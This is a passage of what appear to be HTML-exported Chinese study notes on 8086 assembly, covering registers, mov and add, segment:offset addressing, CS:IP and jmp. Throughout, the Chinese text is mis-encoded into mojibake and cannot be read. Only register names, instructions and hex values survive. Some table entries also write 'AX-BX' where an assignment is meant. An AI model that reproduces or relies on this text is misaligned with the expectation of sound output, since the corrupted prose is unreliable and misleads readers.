å¯¹å¤–è®¾çš„é—´æ¥æ§åˆ¶ã€‚*&#x3D;&#x3D;<strong>ç®€å•åœ°è®²ï¼Œå°±æ˜¯CPUé€šè¿‡æ€»çº¿å‘æ¥å£å¡å‘é€å‘½ä»¤ï¼Œæ¥å£å¡æ ¹æ®CPUçš„å‘½ä»¤æ§åˆ¶å¤–è®¾è¿›è¡Œå·¥ä½œã€‚</strong>&#x3D;&#x3D;*</p><p><strong>å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡</strong></p><p>åˆ†ä¸º<strong>ROMï¼ˆåªè¯»å‚¨å­˜å™¨ï¼‰</strong>ä¸<strong>RAMï¼ˆéšæœºå‚¨å­˜å™¨ï¼‰</strong></p><p><strong>éšæœºå­˜å‚¨å™¨</strong><br>ç”¨äºå­˜æ”¾ä¾›CPUä½¿ç”¨çš„ç»å¤§éƒ¨åˆ†ç¨‹åºå’Œæ•°æ®ï¼Œä¸»éšæœºå­˜å‚¨å™¨ä¸€èˆ¬ç”±ä¸¤ä¸ªä½ç½®ä¸Šçš„RAM ç»„æˆï¼Œ<strong>è£…åœ¨ä¸»æ¿ä¸Š RAM å’Œæ’åœ¨æ‰©å±•æ’æ§½ä¸Šçš„RAMã€‚</strong></p><p><strong>è£…æœ‰BIOS(BasicInput&#x2F;Output Systemï¼ŒåŸºæœ¬è¾“å…¥&#x2F;è¾“å‡ºç³»ç»Ÿ)çš„ROM</strong></p><p>BIOS æ˜¯ç”±ä¸»æ¿å’Œå„ç±»æ¥å£å¡(å¦‚æ˜¾å¡ã€ç½‘å¡ç­‰)å‚å•†æä¾›çš„è½¯ä»¶ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡å®ƒåˆ©ç”¨è¯¥ç¡¬ä»¶è®¾å¤‡è¿›è¡Œæœ€åŸºæœ¬çš„è¾“å…¥è¾“å‡ºã€‚åœ¨ä¸»æ¿å’ŒæŸäº›æ¥å£å¡ä¸Šæ’æœ‰å­˜å‚¨ç›¸åº”BIOSçš„ROMã€‚</p><p><strong>æ¥å£å¡ä¸Šçš„ RAM</strong><br>æŸäº›æ¥å£å¡éœ€è¦å¯¹å¤§æ‰¹é‡è¾“å…¥ã€è¾“å‡ºæ•°æ®è¿›è¡Œæš‚æ—¶å­˜å‚¨ï¼Œåœ¨å…¶ä¸Šè£…æœ‰ RAMã€‚<strong>æœ€å…¸å‹çš„æ˜¯æ˜¾ç¤ºå¡ä¸Šçš„ RAMï¼Œä¸€èˆ¬ç§°ä¸ºæ˜¾å­˜ã€‚æ˜¾ç¤ºå¡éšæ—¶å°†æ˜¾å­˜ä¸­çš„æ•°æ®å‘æ˜¾ç¤ºå™¨ä¸Šè¾“å‡ºã€‚</strong>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å°†éœ€è¦æ˜¾ç¤ºçš„å†…å®¹å†™å…¥æ˜¾å­˜ï¼Œå°±ä¼šå‡ºç°åœ¨æ˜¾ç¤ºå™¨ä¸Šã€‚<img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121102521329.png" alt="image-20231121102521329"></p><h4 id="å†…å­˜åœ°å€ç©ºé—´"><a href="#å†…å­˜åœ°å€ç©ºé—´" class="headerlink" title="å†…å­˜åœ°å€ç©ºé—´"></a>å†…å­˜åœ°å€ç©ºé—´</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121102715622.png" alt="image-20231121102715622"></p><p>åœ¨å›¾ 1.8ä¸­ï¼Œæ‰€æœ‰çš„ç‰©ç†å­˜å‚¨å™¨è¢«çœ‹ä½œä¸€ä¸ªç”±è‹¥å¹²å­˜å‚¨å•å…ƒç»„æˆçš„é€»è¾‘å­˜å‚¨å™¨ï¼Œ<strong>æ¯ä¸ªç‰©ç†å­˜å‚¨å™¨åœ¨è¿™ä¸ªé€»è¾‘å­˜å‚¨å™¨ä¸­å æœ‰ä¸€ä¸ªåœ°å€æ®µï¼Œ&#x3D;&#x3D;å³ä¸€æ®µåœ°å€ç©ºé—´&#x3D;&#x3D;<strong>ã€‚</strong>&#x3D;&#x3D;CPU åœ¨è¿™æ®µåœ°å€ç©ºé—´ä¸­è¯»å†™æ•°æ®ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨ç›¸å¯¹åº”çš„ç‰©ç†å­˜å‚¨å™¨ä¸­è¯»å†™æ•°æ®ã€‚&#x3D;&#x3D;</strong></p><h2 id="ç¬¬äºŒç« å¯„å­˜å™¨-ä½ çŒœä»–ä¸ºä»€ä¹ˆä¼šæœ‰ä¸ªâ€œå¯„â€ï¼ˆï¼‰"><a href="#ç¬¬äºŒç« å¯„å­˜å™¨-ä½ çŒœä»–ä¸ºä»€ä¹ˆä¼šæœ‰ä¸ªâ€œå¯„â€ï¼ˆï¼‰" class="headerlink" title="ç¬¬äºŒç« å¯„å­˜å™¨&#x2F;&#x2F;ä½ çŒœä»–ä¸ºä»€ä¹ˆä¼šæœ‰ä¸ªâ€œå¯„â€ï¼ˆï¼‰"></a>ç¬¬äºŒç« å¯„å­˜å™¨&#x2F;&#x2F;ä½ çŒœä»–ä¸ºä»€ä¹ˆä¼šæœ‰ä¸ªâ€œå¯„â€ï¼ˆï¼‰</h2><p>åœ¨cpuä¸­<strong>å¯„å­˜å™¨è¿›è¡Œä¿¡æ¯å‚¨å­˜</strong></p><p><strong>ä¸åŒçš„ CPUï¼Œå¯„å­˜å™¨çš„ä¸ªæ•°ã€ç»“æ„æ˜¯ä¸ç›¸åŒçš„</strong>ã€‚8086CPU æœ‰14 ä¸ªå¯„å­˜å™¨ï¼Œæ¯ä¸ªå¯„å­˜å™¨æœ‰ä¸€ä¸ªåç§°ã€‚è¿™äº›å¯„å­˜å™¨æ˜¯: AXã€BXã€CXã€DXã€SIã€DIã€SPã€BPã€IPã€CSã€SSã€DSã€ESã€PSWã€‚</p><h4 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h4><p>8086CPU çš„æ‰€æœ‰å¯„å­˜å™¨éƒ½æ˜¯ 16 ä½çš„ï¼Œå¯ä»¥å­˜æ”¾ä¸¤ä¸ªå­—èŠ‚ã€‚AXã€BXã€CXã€DXè¿™4ä¸ªå¯„å­˜å™¨é€šå¸¸ç”¨æ¥å­˜æ”¾ä¸€èˆ¬æ€§çš„æ•°æ®ï¼Œè¢«ç§°ä¸ºé€šç”¨å¯„å­˜å™¨ã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121104928194.png" alt="image-20231121104928194"></p><p><strong>8086CPUçš„ä¸Šä¸€ä»£ CPU ä¸­çš„å¯„å­˜å™¨éƒ½æ˜¯ 8ä½çš„</strong>ï¼Œä¸ºäº†ä¿è¯å…¼å®¹ï¼Œä½¿åŸæ¥åŸºäºä¸Šä»£CPUç¼–å†™çš„ç¨‹åºç¨åŠ ä¿®æ”¹å°±å¯ä»¥è¿è¡Œåœ¨ 8086ä¹‹ä¸Šï¼Œ<strong>8086CPUçš„AXã€BXã€CXã€DXè¿™4ä¸ªå¯„å­˜å™¨éƒ½å¯åˆ†ä¸ºä¸¤ä¸ªå¯ç‹¬ç«‹ä½¿ç”¨çš„8ä½å¯„å­˜å™¨æ¥ç”¨:</strong></p><p><strong>AX</strong> å¯åˆ†ä¸º<strong>AH</strong>å’Œ<strong>AL;</strong><br><strong>BX</strong>å¯åˆ†ä¸º<strong>BH</strong>å’Œ<strong>BL</strong>;<br><strong>CX</strong>å¯åˆ†ä¸º<strong>CH</strong>å’Œ<strong>CL</strong>;<br><strong>DX</strong>å¯åˆ†ä¸º <strong>DH</strong>å’Œ<strong>DL</strong></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121105907995.png" alt="image-20231121105907995"></p><p>AXçš„ä½8ä½(0ä½<del>7ä½)æ„æˆäº†ALå¯„å­˜å™¨ï¼Œå­˜å™¨é«˜8ä½(8ä½</del>15ä½)æ„æˆäº†AHå¯„å­˜å™¨ã€‚AH å’ŒAL å¯„å­˜å™¨æ˜¯å¯ä»¥ç‹¬ç«‹ä½¿ç”¨çš„ 8 ä½å­˜å™¨ã€‚<img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121110012138.png" alt="image-20231121110012138"></p><h4 id="å‡ æ¡æ±‡ç¼–æŒ‡ä»¤"><a href="#å‡ æ¡æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="&#x3D;&#x3D;å‡ æ¡æ±‡ç¼–æŒ‡ä»¤&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;å‡ æ¡æ±‡ç¼–æŒ‡ä»¤&#x3D;&#x3D;</strong></h4><p><em><strong>movä¸add</strong></em></p><table><thead><tr><th>æ±‡ç¼–æŒ‡ä»¤</th><th>æ§åˆ¶CPUå®Œæˆçš„æ“ä½œ</th><th>ç”¨é«˜çº§è¯­è¨€çš„è¯­æ³•æè¿°</th></tr></thead><tbody><tr><td>mov ax,18</td><td><strong>å°†18é€å…¥å¯„å­˜å™¨AX</strong></td><td>AX&#x3D;18</td></tr><tr><td>mov ah,78</td><td><strong>å°†78é€å…¥å¯„å­˜å™¨AH</strong></td><td>AH&#x3D;78</td></tr><tr><td>add ax,8</td><td><strong>å°†å¯„å­˜å™¨AXä¸­çš„æ•°å€¼åŠ ä¸Š8</strong></td><td>AX&#x3D;AX+8</td></tr><tr><td>mov ax,bx</td><td><strong>å°†å¯„å­˜å™¨BXä¸­çš„æ•°æ®é€å…¥å¯„å­˜å™¨AX</strong></td><td>AX-BX</td></tr><tr><td>add ax,bx</td><td><strong>å°†AXå’ŒBXä¸­çš„æ•°å€¼ç›¸åŠ ï¼Œç»“æœå­˜åœ¨AXä¸­</strong></td><td>AX-AX+BX</td></tr></tbody></table><p><strong>åœ¨è¿›è¡Œæ•°æ®ä¼ é€æˆ–è¿ç®—æ—¶ï¼Œè¦æ³¨æ„æŒ‡ä»¤çš„&#x3D;&#x3D;ä¸¤ä¸ªæ“ä½œå¯¹è±¡çš„ä½æ•°åº”å½“æ˜¯ä¸€è‡´çš„&#x3D;&#x3D;</strong></p><h4 id="ç‰©ç†åœ°å€"><a href="#ç‰©ç†åœ°å€" class="headerlink" title="ç‰©ç†åœ°å€"></a>ç‰©ç†åœ°å€</h4><p>CPU è®¿é—®å†…å­˜å•å…ƒæ—¶ï¼Œè¦<strong>ç»™å‡ºå†…å­˜å•å…ƒçš„åœ°å€</strong>ã€‚æ‰€æœ‰çš„å†…å­˜å•å…ƒæ„æˆçš„å­˜å‚¨ç©ºé—´æ˜¯ä¸€ä¸ªä¸€ç»´çš„çº¿æ€§ç©ºé—´ï¼Œ<strong>æ¯ä¸€ä¸ªå†…å­˜å•å…ƒåœ¨è¿™ä¸ªç©ºé—´ä¸­éƒ½æœ‰å”¯ä¸€çš„åœ°å€</strong>ï¼Œæˆ‘ä»¬å°†è¿™ä¸ª<strong>å”¯ä¸€çš„åœ°å€</strong>ç§°ä¸º<strong>ç‰©ç†åœ°å€ã€‚</strong><br><strong>CPU é€šè¿‡åœ°å€æ€»çº¿é€å…¥å­˜å‚¨å™¨çš„ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€</strong>ã€‚åœ¨ CPU å‘åœ°å€æ€»çº¿ä¸Šå‘å‡ºç‰©ç†åœ°å€ä¹‹å‰ï¼Œ<strong>å¿…é¡»è¦åœ¨å†…éƒ¨å…ˆå½¢æˆè¿™ä¸ªç‰©ç†åœ°å€</strong>ã€‚ä¸åŒçš„ CPU å¯ä»¥æœ‰ä¸åŒçš„å½¢æˆç‰©ç†åœ°å€çš„æ–¹å¼ã€‚æˆ‘ä»¬ç°åœ¨è®¨è®º 8086CPU æ˜¯å¦‚ä½•åœ¨å†…éƒ¨å½¢æˆå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€çš„ã€‚</p><h4 id="16ä½ç»“æ„cpuï¼ˆå…¸å‹8086ï¼‰"><a href="#16ä½ç»“æ„cpuï¼ˆå…¸å‹8086ï¼‰" class="headerlink" title="16ä½ç»“æ„cpuï¼ˆå…¸å‹8086ï¼‰"></a>16ä½ç»“æ„cpuï¼ˆå…¸å‹8086ï¼‰</h4><p><strong>æ¦‚æ‹¬åœ°è®²ï¼Œ16 ä½ç»“æ„(<strong>16 ä½æœºã€å­—é•¿ä¸º 16 ä½ç­‰å¸¸è§è¯´æ³•ï¼Œä¸ 16 ä½ç»“æ„çš„å«ç›¸åŒ)<strong>æè¿°äº†ä¸€ä¸ªCPUå…·æœ‰ä¸‹é¢å‡ æ–¹é¢çš„ç»“æ„ç‰¹æ€§ã€‚</strong><br><strong>1.è¿ç®—å™¨ä¸€æ¬¡æœ€å¤šå¯ä»¥å¤„ç† 16ä½çš„æ•°æ®</strong><br><strong>2.å¯„å­˜å™¨çš„æœ€å¤§å®½åº¦ä¸º16ä½;</strong><br><strong>3.å¯„å­˜å™¨å’Œè¿ç®—å™¨ä¹‹é—´çš„é€šè·¯ä¸º 16ä½</strong><br>8086 æ˜¯ 16 ä½ç»“æ„çš„ CPUï¼Œ</strong>è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ 8086 å†…éƒ¨ï¼Œèƒ½å¤Ÿä¸€æ¬¡æ€§å¤„ç†ã€ä¼ è¾“ã€æš‚æ—¶å­˜å‚¨çš„ä¿¡æ¯çš„æœ€å¤§é•¿åº¦æ˜¯ 16 ä½çš„ã€‚</strong>å†…å­˜å•å…ƒçš„åœ°å€åœ¨é€ä¸Šåœ°å€æ€»çº¿ä¹‹å‰ï¼Œå¿…é¡»åœ¨ CPUä¸­å¤„ç†ã€ä¼ è¾“ã€æš‚æ—¶å­˜æ”¾ï¼Œ<strong>å¯¹äº 16ä½ CPUï¼Œèƒ½ä¸€æ¬¡æ€§å¤„ç†ã€ä¼ è¾“ã€æš‚æ—¶å­˜å‚¨ 16ä½çš„åœ°å€</strong>ã€‚</p><h4 id="8086cpuç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•"><a href="#8086cpuç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•" class="headerlink" title="8086cpuç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•"></a><strong>8086cpuç»™å‡ºç‰©ç†åœ°å€çš„æ–¹æ³•</strong></h4><p>8086CPUæœ‰20ä½åœ°å€æ€»çº¿ï¼Œå¯ä»¥ä¼ é€20ä½åœ°å€ï¼Œè¾¾åˆ°1MBå¯»å€èƒ½åŠ›ã€‚8086CPUåˆæ˜¯16ä½ç»“æ„ï¼Œåœ¨å†…éƒ¨ä¸€æ¬¡æ€§å¤„ç†ã€ä¼ è¾“ã€æš‚æ—¶å­˜å‚¨çš„åœ°å€ä¸º 16 ä½ã€‚<br>8086CPUé‡‡ç”¨ä¸€ç§åœ¨å†…éƒ¨ç”¨ä¸¤ä¸ª 16ä½åœ°å€åˆæˆçš„æ–¹æ³•æ¥å½¢æˆä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€8086CPUç›¸å…³éƒ¨ä»¶çš„é€»è¾‘ç»“æ„å¦‚å›¾2.6æ‰€ç¤ºã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121202629121.png" alt="image-20231121202629121"></p><p>å½“8086CPUè¦è¯»å†™å†…å­˜æ—¶:<br>1.CPUä¸­çš„ç›¸å…³éƒ¨ä»¶æä¾›<strong>ä¸¤ä¸ª16ä½çš„åœ°å€</strong>ï¼Œä¸€ä¸ªç§°ä¸º<strong>æ®µåœ°å€</strong>ï¼Œå¦ä¸€ä¸ªç§°ä¸º<strong>åç§»åœ°å€:</strong></p><p>2.<strong>æ®µåœ°å€å’Œåç§»åœ°å€</strong>é€šè¿‡<strong>å†…éƒ¨æ€»çº¿</strong>é€å…¥ä¸€ä¸ªç§°ä¸º<strong>åœ°å€åŠ æ³•å™¨</strong>çš„éƒ¨ä»¶;</p><p>3.<strong>åœ°å€åŠ æ³•å™¨å°†ä¸¤ä¸ª16ä½åœ°å€</strong>åˆæˆä¸º<strong>ä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€;</strong></p><p>4**.åœ°å€åŠ æ³•å™¨<strong>é€šè¿‡</strong>å†…éƒ¨æ€»çº¿<strong>å°† <strong>20ä½ç‰©ç†åœ°å€</strong>é€å…¥</strong>è¾“å…¥è¾“å‡ºæ§åˆ¶ç”µè·¯**;</p><p>5.<strong>è¾“å…¥è¾“å‡ºæ§åˆ¶ç”µè·¯</strong>å°† <strong>20ä½ç‰©ç†åœ°å€</strong>é€ä¸Š<strong>åœ°å€æ€»çº¿</strong>:</p><p>6.<strong>20ä½ç‰©ç†åœ°å€è¢«åœ°å€æ€»çº¿ä¼ é€åˆ°å­˜å‚¨å™¨ã€‚</strong></p><p>åœ°å€åŠ æ³•å™¨é‡‡ç”¨<strong>ç‰©ç†åœ°å€&#x3D;æ®µåœ°å€X16+åç§»åœ°å€</strong>çš„æ–¹æ³•ç”¨æ®µåœ°å€å’Œåç§»åœ°å€åˆæˆç‰©ç†åœ°å€ã€‚ä¾‹å¦‚ï¼Œ8086CPU è¦è®¿é—®åœ°å€ä¸º 123C8H çš„å†…å­˜å•å…ƒï¼Œæ­¤æ—¶ï¼Œåœ°å€åŠ æ³•å™¨çš„å·¥ä½œè¿‡ç¨‹å¦‚å›¾ 2.7 æ‰€ç¤ºã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231123201756825.png" alt="image-20231123201756825"></p><p><strong>&#x3D;&#x3D;ä¸€ä¸ªæ•°æ®çš„åå…­è¿›åˆ¶å½¢å¼å·¦ç§»1ä½ï¼Œç›¸å½“äºä¹˜ä»¥16:ä¸€ä¸ªæ•°æ®çš„åè¿›å½¢å¼å·¦ç§»1ä½ï¼Œç›¸å½“äºä¹˜ä»¥10;ä¸€ä¸ªXè¿›åˆ¶çš„æ•°æ®å·¦ç§»1ä½ï¼Œç›¸å½“äºä¹˜ä»¥Xã€‚&#x3D;&#x3D;</strong></p><h4 id="â€œæ®µåœ°å€X16-åç§»åœ°å€-ç‰©ç†åœ°å€â€çš„æœ¬è´¨å«ä¹‰"><a href="#â€œæ®µåœ°å€X16-åç§»åœ°å€-ç‰©ç†åœ°å€â€çš„æœ¬è´¨å«ä¹‰" class="headerlink" title="â€œæ®µåœ°å€X16+åç§»åœ°å€&#x3D;ç‰©ç†åœ°å€â€çš„æœ¬è´¨å«ä¹‰"></a>â€œæ®µåœ°å€X16+åç§»åœ°å€&#x3D;ç‰©ç†åœ°å€â€çš„æœ¬è´¨å«ä¹‰</h4><p><strong>â€œæ®µåœ°å€x16+åç§»åœ°å€&#x3D;ç‰©ç†åœ°å€â€</strong>çš„æœ¬è´¨å«ä¹‰æ˜¯:CPU åœ¨è®¿é—®å†…å­˜æ—¶ï¼Œç”¨ä¸€ä¸ª**&#x3D;&#x3D;åŸºç¡€åœ°å€&#x3D;&#x3D;(æ®µåœ°å€X16)<strong>å’Œä¸€ä¸ª</strong><u>ç›¸å¯¹äº</u>åŸºç¡€åœ°å€çš„&#x3D;&#x3D;åç§»åœ°å€&#x3D;&#x3D;<strong>ç›¸åŠ ï¼Œ</strong>ç»™å‡ºå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€<strong>ã€‚<br>æ›´ä¸€èˆ¬åœ°è¯´ï¼Œ8086CPUçš„è¿™ç§å¯»å€åŠŸèƒ½æ˜¯&#x3D;&#x3D;</strong><u>â€œåŸºç¡€åœ°å€+åç§»åœ°å€&#x3D;ç‰©ç†åœ°å€â€</u><strong>&#x3D;&#x3D;ï¼ˆ</strong>è¿™å°±æ˜¯æœ¬è´¨ï¼Œè¯·ç‰¢è®°å®ƒ**ï¼‰å¯»å€æ¨¡å¼çš„ä¸€ç§å…·ä½“å®ç°æ–¹æ¡ˆã€‚8086CPU ä¸­ï¼Œæ®µåœ°å€x16 å¯çœ‹ä½œæ˜¯åŸºç¡€åœ°å€ã€‚</p><h4 id="æ®µçš„æ¦‚å¿µ"><a href="#æ®µçš„æ¦‚å¿µ" class="headerlink" title="æ®µçš„æ¦‚å¿µ"></a>æ®µçš„æ¦‚å¿µ</h4><p>å…¶å®ï¼Œå†…å­˜å¹¶æ²¡æœ‰åˆ†æ®µï¼Œæ®µçš„åˆ’åˆ†æ¥è‡ªäº CPUï¼Œç”±äº 8086CPU ç”¨â€œåŸºç¡€åœ°å€(æ®µåœ°å€X16)+åç§»åœ°å€&#x3D;ç‰©ç†åœ°å€â€çš„æ–¹å¼ç»™å‡ºå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨åˆ†æ®µçš„æ–¹å¼æ¥ç®¡ç†å†…å­˜ã€‚</p><p>ä»¥åï¼Œåœ¨ç¼–ç¨‹æ—¶å¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†è‹¥å¹²åœ°å€è¿ç»­çš„å†…å­˜å•å…ƒçœ‹ä½œä¸€ä¸ªæ®µï¼Œç”¨æ®µåœ°å€X16 å®šä½æ®µçš„èµ·å§‹åœ°å€(åŸºç¡€åœ°å€)ï¼Œç”¨åç§»åœ°å€å®šä½æ®µä¸­çš„å†…å­˜å•å…ƒã€‚<strong>æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„:&#x3D;&#x3D;æ®µåœ°å€X16 å¿…ç„¶æ˜¯ 16 çš„å€æ•°ï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„èµ·å§‹åœ°å€ä¹Ÿä¸€å®šæ˜¯ 16 çš„å€æ•°&#x3D;&#x3D;: &#x3D;&#x3D;åç§»åœ°å€ä¸º16ä½ï¼Œ16ä½åœ°å€çš„å¯»å€èƒ½åŠ›ä¸º 64KBï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„é•¿åº¦æœ€å¤§ä¸º 64KB&#x3D;&#x3D;</strong></p><h4 id="æ®µå¯„å­˜å™¨"><a href="#æ®µå¯„å­˜å™¨" class="headerlink" title="æ®µå¯„å­˜å™¨"></a>æ®µå¯„å­˜å™¨</h4><p>ä»€ä¹ˆéƒ¨ä»¶æä¾›æ®µåœ°å€ã€‚æ®µåœ°å€åœ¨ 8086CPU çš„æ®µå¯„å­˜å™¨ä¸­å­˜æ”¾ã€‚8086CPU æœ‰ <strong>4 ä¸ªæ®µå­˜å™¨:CSã€DSã€SSã€ES</strong>ã€‚å½“8086CPU è¦è®¿é—®å†…å­˜æ—¶ç”±è¿™4ä¸ªæ®µå¯„å­˜å™¨æä¾›å†…å­˜å•å…ƒçš„æ®µåœ°å€ã€‚</p><h4 id="CSå’ŒIP"><a href="#CSå’ŒIP" class="headerlink" title="CSå’ŒIP"></a>CSå’ŒIP</h4><p><strong>CSå’ŒIP</strong>æ˜¯8086CPUä¸­ä¸¤ä¸ªæœ€å…³é”®çš„å­˜å™¨ï¼Œå®ƒä»¬æŒ‡ç¤ºäº†CPU å½“å‰è¦è¯»å–æŒ‡ä»¤çš„åœ°å€ã€‚<strong>CS ä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</strong>ã€‚<br>åœ¨8086PC æœºä¸­ï¼Œä»»æ„æ—¶åˆ»ï¼Œ<strong>è®¾ CS ä¸­çš„å†…å®¹ä¸ºM</strong>ï¼Œ<strong>IP ä¸­çš„å†…å®¹ä¸ºN</strong>ï¼Œ8086CPU å°†<strong>ä»å†…å­˜Mx16+Nå•å…ƒå¼€å§‹</strong>ï¼Œè¯»å–ä¸€æ¡æŒ‡ä»¤å¹¶æ‰§è¡Œã€‚<br>ä¹Ÿå¯ä»¥è¿™æ ·è¡¨è¿°:8086æœºä¸­ï¼Œä»»æ„æ—¶åˆ»ï¼ŒCPUå°†CS:IP æŒ‡å‘çš„å†…å®¹å½“ä½œæŒ‡ä»¤æ‰§è¡Œå›¾2.10å±•ç¤ºäº†8086CPU è¯»å–ã€æ‰§è¡ŒæŒ‡ä»¤çš„å·¥ä½œåŸç†ï¼ˆå›¾ä¸­åªåŒ…æ‹¬äº†å’Œæ‰€è¦è¯´æ˜çš„é—®é¢˜<br>å¯†åˆ‡ç›¸å…³çš„éƒ¨ä»¶ï¼Œå›¾ä¸­æ•°å­—éƒ½ä¸ºåå…­è¿›åˆ¶)ã€‚ï¼ˆæ²¡å†™å®Œï¼Œæœªå®Œå¾…ç»­ï¼‰</p><p><strong>&#x3D;&#x3D;8086CPU çš„å·¥ä½œè¿‡ç¨‹å¯ä»¥ç®€è¦æè¿°å¦‚ä¸‹&#x3D;&#x3D;</strong><br>&#x3D;&#x3D;<strong>1.ä» CS:IP æŒ‡å‘çš„å†…å­˜å•å…ƒè¯»å–æŒ‡ä»¤ï¼Œè¯»å–çš„æŒ‡ä»¤è¿›å…¥æŒ‡ä»¤ç¼“å†²å™¨</strong>&#x3D;&#x3D;</p><p>&#x3D;&#x3D;<strong>2.IP&#x3D;IP+æ‰€è¯»å–æŒ‡ä»¤çš„é•¿åº¦ï¼Œä»è€ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤;</strong>&#x3D;&#x3D;</p><p>&#x3D;&#x3D;<strong>3.æ‰§è¡ŒæŒ‡ä»¤ã€‚è½¬åˆ°æ­¥éª¤(1)ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚</strong>&#x3D;&#x3D;<br>åœ¨ 8086CPUåŠ ç”µå¯åŠ¨æˆ–å¤ä½å(å³ CPU åˆšå¼€å§‹å·¥ä½œæ—¶)CS å’ŒIPè¢«è®¾ç½®ä¸ºCS&#x3D;FFFFHï¼ŒIP&#x3D;0000Hï¼Œå³åœ¨ 8086PC æœºåˆšå¯åŠ¨æ—¶ï¼ŒCPU ä»å†…å­˜ FFFF0H å•å…ƒä¸­è¯»å–æŒ‡æ‰§è¡Œï¼ŒFFFF0Hå•å…ƒä¸­çš„æŒ‡ä»¤æ˜¯8086PCæœºå¼€æœºåæ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚</p><h4 id="ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤"><a href="#ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤" class="headerlink" title="&#x3D;&#x3D;ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤&#x3D;&#x3D;"></a>&#x3D;&#x3D;ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤&#x3D;&#x3D;</h4><p>mov æŒ‡ä»¤&#x3D;&#x3D;<strong>ä¸èƒ½</strong>&#x3D;&#x3D;ç”¨äºè®¾ç½® CSã€IP çš„å€¼</p><p>&#x3D;&#x3D;<strong>jmp æŒ‡ä»¤</strong>&#x3D;&#x3D;<strong>å¯ä»¥ä¿®æ”¹CSã€IP çš„æŒ‡ä»¤</strong></p><p><strong>&#x3D;&#x3D;jmpè¯­æ³•ï¼šâ€œjmp æ®µåœ°å€:ååœ°å€â€&#x3D;&#x3D;</strong>jmp 2AE3:3ï¼Œæ‰§è¡Œå:CS&#x3D;2AE3Hï¼ŒIP&#x3D;0003Hï¼ŒCPUå°†ä»2AE33H å¤„è¯»å–æŒ‡ä»¤</p><p>â€‹<strong>&#x3D;&#x3D;jmp axï¼Œåœ¨å«ä¹‰ä¸Šå¥½ä¼¼:mov IP,ax&#x3D;&#x3D;</strong></p><h4 id="ä»£ç æ®µ"><a href="#ä»£ç æ®µ" class="headerlink" title="ä»£ç æ®µ"></a>ä»£ç æ®µ</h4><p>å‰é¢è®²è¿‡ï¼Œå¯¹äº 8086PC æœºï¼Œåœ¨ç¼–ç¨‹æ—¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µã€‚æˆ‘ä»¬å¯ä»¥å°†é•¿åº¦ä¸º N(Nâ‰¤64KB)çš„ä¸€ç»„ä»£ç ï¼Œå­˜åœ¨ä¸€ç»„åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º 16 çš„å€æ•°çš„å†…å­˜å•å…ƒä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºï¼Œ<strong>è¿™æ®µå†…å­˜æ˜¯ç”¨æ¥å­˜æ”¾ä»£ç çš„ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªä»£ç æ®µ</strong></p><h4 id="æŸ¥çœ‹cpuå’Œå†…å­˜ï¼Œç”¨æœºå™¨æŒ‡ä»¤å’Œæ±‡ç¼–æŒ‡ä»¤ç¼–ç¨‹ï¼ˆdosboxï¼‰"><a href="#æŸ¥çœ‹cpuå’Œå†…å­˜ï¼Œç”¨æœºå™¨æŒ‡ä»¤å’Œæ±‡ç¼–æŒ‡ä»¤ç¼–ç¨‹ï¼ˆdosboxï¼‰" class="headerlink" 